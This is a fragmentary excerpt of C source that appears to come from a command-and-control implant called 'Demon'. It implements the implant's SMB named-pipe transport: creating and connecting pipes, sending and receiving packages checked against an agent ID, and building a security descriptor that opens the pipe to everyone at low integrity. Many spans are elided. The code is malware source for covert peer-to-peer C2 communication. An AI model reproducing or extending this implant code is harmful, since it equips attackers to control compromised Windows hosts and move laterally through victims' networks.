...
{
    if ( ! ((INSTANCE *)Instance)->Config.Transport.Handle )
    {
        ...
        ((INSTANCE *)Instance)->Config.Transport.Handle = ((INSTANCE *)Instance)->Win32.CreateNamedPipeW( ((INSTANCE *)Instance)->Config.Transport.Name,  // Named Pipe
        ...
        if ( ! ((INSTANCE *)Instance)->Win32.ConnectNamedPipe( ((INSTANCE *)Instance)->Config.Transport.Handle, NULL ) )
        {
            SysNtClose( ((INSTANCE *)Instance)->Config.Transport.Handle );
            return FALSE;
        }

        /* Send the message/package we want to send to the new client... */
        return PipeWrite( ((INSTANCE *)Instance)->Config.Transport.Handle, Send );
    }

    if ( ! PipeWrite( ((INSTANCE *)Instance)->Config.Transport.Handle, Send ) )
    {
        ...
        if ( NtGetLastError() == ERROR_NO_DATA )
        {
            ...
            {
                SysNtClose( ((INSTANCE *)Instance)->Config.Transport.Handle );
                ((INSTANCE *)Instance)->Config.Transport.Handle = NULL;
            }
...
BOOL SmbRecv( PBUFFER Resp )
{
    ...
    if ( ((INSTANCE *)Instance)->Win32.PeekNamedPipe( ((INSTANCE *)Instance)->Config.Transport.Handle, NULL, 0, NULL, &BytesSize, NULL ) )
    {
        if ( BytesSize > sizeof( UINT32 ) + sizeof( UINT32 ) )
        {
            if ( ! ((INSTANCE *)Instance)->Win32.ReadFile( ((INSTANCE *)Instance)->Config.Transport.Handle, &DemonId, sizeof( UINT32 ), &BytesSize, NULL ) && NtGetLastError() != ERROR_MORE_DATA )
            {
            ...
            if ( ((INSTANCE *)Instance)->Session.AgentID != DemonId )
            {
            ...
            if ( ! ((INSTANCE *)Instance)->Win32.ReadFile( ((INSTANCE *)Instance)->Config.Transport.Handle, &PackageSize, sizeof( UINT32 ), &BytesSize, NULL ) && NtGetLastError() != ERROR_MORE_DATA )
            {
            ...
            Resp->Buffer = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, PackageSize );
            Resp->Length = PackageSize;

            if ( ! PipeRead( ((INSTANCE *)Instance)->Config.Transport.Handle, Resp ) )
            {
                PRINTF( "PipeRead failed with to read 0x%x bytes from pipe\n", Resp->Length )
                if ( Resp->Buffer )
                {
                    ((INSTANCE *)Instance)->Win32.LocalFree( Resp->Buffer );
                    Resp->Buffer = NULL;
                }
...
VOID SmbSecurityAttrOpen( PSMB_PIPE_SEC_ATTR SmbSecAttr, PSECURITY_ATTRIBUTES SecurityAttr )
{
    ...
    if ( ! ((INSTANCE *)Instance)->Win32.AllocateAndInitializeSid( &SidIdAuth, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &SmbSecAttr->Sid ) )
    {
    ...
    Result = ((INSTANCE *)Instance)->Win32.SetEntriesInAclW( 1, &ExplicitAccess, NULL, &DAcl );
    ...
    if ( ! ((INSTANCE *)Instance)->Win32.AllocateAndInitializeSid( &SidLabel, 1, SECURITY_MANDATORY_LOW_RID, 0, 0, 0, 0, 0, 0, 0, &SmbSecAttr->SidLow ) )
    {
        PRINTF( "AllocateAndInitializeSid failed: %u\n", NtGetLastError() );
    }
    PRINTF( "sidLow: %p\n", SmbSecAttr->SidLow );
    ...
    if ( ! ((INSTANCE *)Instance)->Win32.InitializeAcl( SmbSecAttr->SAcl, MAX_PATH, ACL_REVISION_DS ) )
    {
        PRINTF( "InitializeAcl failed: %u\n", NtGetLastError() );
    }

    if ( ! ((INSTANCE *)Instance)->Win32.AddMandatoryAce( SmbSecAttr->SAcl, ACL_REVISION_DS, NO_PROPAGATE_INHERIT_ACE, 0, SmbSecAttr->SidLow ) )
    {
    ...
    if ( ! ((INSTANCE *)Instance)->Win32.InitializeSecurityDescriptor( SmbSecAttr->SecDec, SECURITY_DESCRIPTOR_REVISION ) )
    {
        PRINTF( "InitializeSecurityDescriptor failed: %u\n", NtGetLastError() );
    }

    if ( ! ((INSTANCE *)Instance)->Win32.SetSecurityDescriptorDacl( SmbSecAttr->SecDec, TRUE, DAcl, FALSE ) )
    {
        PRINTF( "SetSecurityDescriptorDacl failed: %u\n", NtGetLastError() );
    }

    if ( ! ((INSTANCE *)Instance)->Win32.SetSecurityDescriptorSacl( SmbSecAttr->SecDec, TRUE, SmbSecAttr->SAcl, FALSE ) )
    {
...
VOID SmbSecurityAttrFree( PSMB_PIPE_SEC_ATTR SmbSecAttr )
{
    if ( SmbSecAttr->Sid )
    {
        ((INSTANCE *)Instance)->Win32.FreeSid( SmbSecAttr->Sid );
        SmbSecAttr->Sid = NULL;
    }

    if ( SmbSecAttr->SidLow )
    {
        ((INSTANCE *)Instance)->Win32.FreeSid( SmbSecAttr->SidLow );
